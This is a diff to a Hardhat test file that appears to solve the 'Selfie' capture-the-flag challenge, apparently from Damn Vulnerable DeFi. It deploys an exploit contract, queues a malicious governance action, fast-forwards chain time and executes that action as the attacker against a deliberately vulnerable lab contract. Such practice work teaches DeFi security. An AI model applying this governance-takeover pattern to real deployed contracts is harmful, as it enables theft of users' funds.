@@ -31,6 +31,25 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const factory = await ethers.getContractFactory('SelfieExploit', attacker);
+        const instance = await factory.deploy(
+            this.governance.address, 
+            this.pool.address, 
+            this.token.address
+        );
+        //execute exploit and get actionId
+        const tx = await instance.attack();
+        const rc = await tx.wait();
+        const event = rc.events.find(event => event.address === this.governance.address);
+        const eventAbi = ["event ActionQueued(uint256 actionId, address indexed caller)"];
+        let log = new ethers.utils.Interface(eventAbi).parseLog(event);
+        const [actionId] = log.args;
+
+        //wait 2 days
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        
+        //execute proposed action
+        await this.governance.connect(attacker).executeAction(actionId);         
     });
 
     after(async function () {
